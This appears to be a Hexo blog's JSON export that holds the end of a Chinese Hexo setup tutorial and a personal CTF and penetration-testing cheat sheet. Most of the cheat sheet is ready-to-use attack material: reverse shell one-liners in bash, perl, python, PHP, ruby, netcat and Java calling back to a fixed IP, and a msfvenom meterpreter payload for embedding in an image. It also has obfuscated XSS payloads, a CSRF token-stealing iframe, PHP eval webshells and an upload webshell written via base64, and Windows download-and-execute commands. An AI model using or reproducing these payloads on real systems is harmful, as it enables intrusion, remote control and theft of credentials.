正则替换图片标签查找匹配 1\\!\\[\\]\\(.*?/(.*?)\\) 替换 1&#123;%asset_img $1%&#125; 8.设置8.1添加tags执行命令 1hexo new page &quot;tags&quot; 注意：要加page，我自己设置了好几次没加page，都生成的是日志，加上page会在source目录下新创建一个tags目录 修改主题配置文件 然后就大功告成了 8.2添加头像在source目录下创建images目录，将头像放在images目录下。在生成静态页面时，会将source/images/的图片复制到public/images/，在url里添加路径即可添加头像 9.重装系统后再次使用Hexo重装系统之后，之前的一些设置会丢失，再次执行一遍命令即可。需要再完成一遍的步骤有安装Node.js、安装Git、配置SSH key、安装Hexo。安装Hexo这一步，若之前博客的文件夹还存在只需要执行 1234d: //跳转盘符cd Blog //跳转到存放Blog文件的文件夹npm install -g hexo //安装hexonpm install hexo-deployer-git --save //安装上传服务 若之前的博客不存在了，就要执行hexo初始化 1hexo init 完成之后，就可以继续写博客了。注：一定要及时备份博客的source文件夹、_config.yml、themes文件夹。source文件夹中是md格式的文章，另外两个则是整个博客的配置文件和主题样式。 10.参考文章[1] 使用hexo+github搭建免费个人博客详细教程 [2] hexo博客图片问题 [3] 开始使用-NexT 使用文档 [4] Hexo [5] Hexo+Next个人博客主题优化","categories":[],"tags":[]},{"title":"'Notes'","slug":"Notes","date":"2009-12-31T11:41:10.000Z","updated":"2019-07-07T14:00:32.954Z","comments":true,"path":"2009/12/31/Notes/","link":"","permalink":"https://chirec.github.io/2009/12/31/Notes/","excerpt":"","text":"CTF流程1.查看源代码2.查看robots.txt linux下空格绕过1234cat flag.txtcat$&#123;IFS&#125;flag.txtcat$IFS$9flag.txtcat&lt;flag.txt ${IFS} Shell 脚本中有个变量叫IFS(Internal Field Seprator) ，内部域分隔符。完整定义是The shell uses the value stored in IFS, which is the space, tab, and newline characters by default, to delimit words for the read and set commands, when parsing output from command substitution, and when performing variable substitution. PHP is_numeric 绕过使用十六进制绕过 outguess1outguess -r picture text Linuxpython导入bash 12python -c &apos;import pty;pty.spawn(&quot;/bin/sh&quot;)&apos;python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; 设置ssh使用root登录 123vim /etc/ssh/sshd_configPasswordAuthentication yesPermitRootLogin yes 开机启动ssh服务 1update-rc.d ssh enable bash_history 复制粘贴 1234复制命令：Ctrl + Shift + C粘贴命令：Ctrl + Shift + V复制命令：Ctrl|Shift + Insert|用鼠标选中粘贴命令：Crtl|Shift + Insert|单击鼠标滚轮 1ctrl + 鼠标选中后粘贴会立即执行 \\$()和\\${} \\$()是变量替换\\${}是命令替换 添加用户1234useradd -d &quot;/home/chessur&quot; -m -s &quot;/bin/bash&quot; chessur//指定家目录//-m 若家目录不存在，则强制创建家目录//-s 指定shell ufw1234ufw default deny //设置端口默认关闭ufw status //查看ufw状态ufw allow port //放行端口ufw enable //开启ufw 单用户模式开机选advanced，按e，找到ro recovery nomodeset，修改为rw single init=/bin/bash ，修改之后按F10或Ctrl+X进入单用户模式 反弹shellBash12bash -i &gt;&amp; /dev/tcp/192.168.126.1/6666 0&gt;&amp;1bash -i 5&lt;&gt;/dev/tcp/192.168.126.1/6666 0&gt;&amp;5 1&gt;&amp;5 PERL1perl -e &apos;use Socket;$i=&quot;192.168.126.1&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos; python1python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.126.1&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; PHP1php -r &apos;$sock=fsockopen(&quot;192.168.126.1&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos; Ruby1ruby -rsocket -e&apos;f=TCPSocket.open(&quot;192.168.126.1&quot;,6666).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; Netcat1nc -e /bin/sh 192.168.126.1 6666 其他1rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.126.1 6666 &gt;/tmp/f Java1234r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.126.1/6666;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor()&lt;?PHP fputs(fopen(&apos;windy.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[windy])?&gt;&apos;);?&gt; 图片反弹Shell 工具：https://github.com/peewpw/Invoke-PSImage 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.126.1 LPORT=6666 -f psh-reflection -o /root/image_shell.ps1 XSSpayload1javascrip&amp;#x0000000074:alert(1) &amp;#x0000空子节 1&lt;script&gt;$=~[];$=&#123;___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:(&#123;&#125;+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:(&#123;&#125;+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$&#125;;$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(&quot;+$.__$+&quot;)&quot;+&quot;\\&quot;&quot;)())()&lt;/script&gt; url转码 1%3C%73%63%72%69%70%74%3E%24%3D%7E%5B%5D%3B%24%3D%7B%5F%5F%5F%3A%2B%2B%24%2C%24%24%24%24%3A%28%21%5B%5D%2B%22%22%29%5B%24%5D%2C%5F%5F%24%3A%2B%2B%24%2C%24%5F%24%5F%3A%28%21%5B%5D%2B%22%22%29%5B%24%5D%2C%5F%24%5F%3A%2B%2B%24%2C%24%5F%24%24%3A%28%7B%7D%2B%22%22%29%5B%24%5D%2C%24%24%5F%24%3A%28%24%5B%24%5D%2B%22%22%29%5B%24%5D%2C%5F%24%24%3A%2B%2B%24%2C%24%24%24%5F%3A%28%21%22%22%2B%22%22%29%5B%24%5D%2C%24%5F%5F%3A%2B%2B%24%2C%24%5F%24%3A%2B%2B%24%2C%24%24%5F%5F%3A%28%7B%7D%2B%22%22%29%5B%24%5D%2C%24%24%5F%3A%2B%2B%24%2C%24%24%24%3A%2B%2B%24%2C%24%5F%5F%5F%3A%2B%2B%24%2C%24%5F%5F%24%3A%2B%2B%24%7D%3B%24%2E%24%5F%3D%28%24%2E%24%5F%3D%24%2B%22%22%29%5B%24%2E%24%5F%24%5D%2B%28%24%2E%5F%24%3D%24%2E%24%5F%5B%24%2E%5F%5F%24%5D%29%2B%28%24%2E%24%24%3D%28%24%2E%24%2B%22%22%29%5B%24%2E%5F%5F%24%5D%29%2B%28%28%21%24%29%2B%22%22%29%5B%24%2E%5F%24%24%5D%2B%28%24%2E%5F%5F%3D%24%2E%24%5F%5B%24%2E%24%24%5F%5D%29%2B%28%24%2E%24%3D%28%21%22%22%2B%22%22%29%5B%24%2E%5F%5F%24%5D%29%2B%28%24%2E%5F%3D%28%21%22%22%2B%22%22%29%5B%24%2E%5F%24%5F%5D%29%2B%24%2E%24%5F%5B%24%2E%24%5F%24%5D%2B%24%2E%5F%5F%2B%24%2E%5F%24%2B%24%2E%24%3B%24%2E%24%24%3D%24%2E%24%2B%28%21%22%22%2B%22%22%29%5B%24%2E%5F%24%24%5D%2B%24%2E%5F%5F%2B%24%2E%5F%2B%24%2E%24%2B%24%2E%24%24%3B%24%2E%24%3D%28%24%2E%5F%5F%5F%29%5B%24%2E%24%5F%5D%5B%24%2E%24%5F%5D%3B%24%2E%24%28%24%2E%24%28%24%2E%24%24%2B%22%5C%22%22%2B%24%2E%24%5F%24%5F%2B%28%21%5B%5D%2B%22%22%29%5B%24%2E%5F%24%5F%5D%2B%24%2E%24%24%24%5F%2B%22%5C%5C%22%2B%24%2E%5F%5F%24%2B%24%2E%24%24%5F%2B%24%2E%5F%24%5F%2B%24%2E%5F%5F%2B%22%28%22%2B%24%2E%5F%5F%24%2B%22%29%22%2B%22%5C%22%22%29%28%29%29%28%29%3C%2F%73%63%72%69%70%74%3E 123&lt;script&gt;eval(&apos;\\x76\\x61\\x72\\40\\141\\75String.fromCharCode(49);\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028a\\u0029;&apos;)&lt;/script&gt; 123&lt;script&gt;eval(&apos;\\x76\\x61\\x72\\40\\141\\75String.fromCharCode(%34%39);\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028a\\u0029;&apos;)&lt;/script&gt; 123&lt;script&gt;eval(&apos;\\x76\\x61\\x72\\40\\141\\75%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%34%39%29%3b\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028a\\u0029;&apos;)&lt;/script&gt; 获取usertoken 1&lt;iframe src=&quot;../csrf&quot;onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt; PHP伪协议写一句话 1&lt;?php echo `echo PD9waHAgQGV2YWwoJF9QT1NUWydXaW5keSddKT8+|base64 -d &gt; upload/1.php` ;?&gt; 一句话写上传马 1?a=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9))); 12345&lt;?php @$temp = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];@$file = basename($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);if (empty ($file))&#123;echo &quot;&lt;form action = &apos;&apos; method = &apos;POST&apos; ENCTYPE=&apos;multipart/form-data&apos;&gt;\\n&quot;;echo &quot;Local file: &lt;input type = &apos;file&apos; name = &apos;upload_file&apos;&gt;\\n&quot;;echo &quot;&lt;input type = &apos;submit&apos; value = &apos;Upload&apos;&gt;\\n&quot;;echo &quot;&lt;/form&gt;\\n&lt;pre&gt;\\n\\n&lt;/pre&gt;&quot;;&#125;else &#123;if(move_uploaded_file($temp,$file))&#123;echo &quot;File uploaded successfully.&lt;p&gt;\\n&quot;;&#125;else &#123;echo &quot;Unable to upload &quot; . $file . &quot;.&lt;p&gt;\\n&quot;;&#125;&#125;?&gt; MSF反弹shell 1use exploit/multi/script/web_delivery Mysql命令行导入数据库 1mysql -uroot -pPassword databasename &lt; filedir 后台拿Shell修改模板代码 修改上传图片格式 上传模板若会自动解压，可以上传zip压缩包 WebShellWebShell的权限Webshell的权限一般是由解析执行WebShell的Web容器自身权限决定的如果是linux做了操作系统加固 能上传 但是只能执行系统命令权限 但是无法获得shell那就说明做了目录权限加固但是没有做中间件加固（可上传）没做操作系统加固目录加固的权限是可读可执行但不可写 Windows提权PowerShell提权DOS下载文件1.创建downfile.vbs下载文件12echo set a=createobject(^&quot;adod^&quot;+^&quot;b.stream^&quot;):set w=createobject(^&quot;micro^&quot;+^&quot;soft.xmlhttp^&quot;):w.open^&quot;get^&quot;,wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 &gt;&gt; downfile.vbscscript downfile.vbs http://192.168.40.13:9090/fileLibrary/5d5X9mSTZXjH9VlhXNN/x.txt D:\\\\tomcat8.5\\\\webapps\\\\x.jsp 2.使用bitsadmin命令1bitsadmin /transfer n http://www.xx.com/code.jpg c:\\users\\sdyp\\desktop\\ff.jpg 名词解释钓鱼攻击水坑攻击一种计算机入侵手法，其针对的目标多为特定的团体（组织、行业、地区等）。攻击者首先通过猜测（或观察）确定这组目标经常访问的网站，并入侵其中一个或多个，植入恶意软件，最后，达到感染该组目标中部分成员的目的。 信息收集员工信息社交关系网博客工资银行账户 企业使用软件信息业务伙伴销售银行账号招聘岗位 JavaScript编码12var code = &apos;\\u003c&apos;code","categories":[],"tags":[]}]}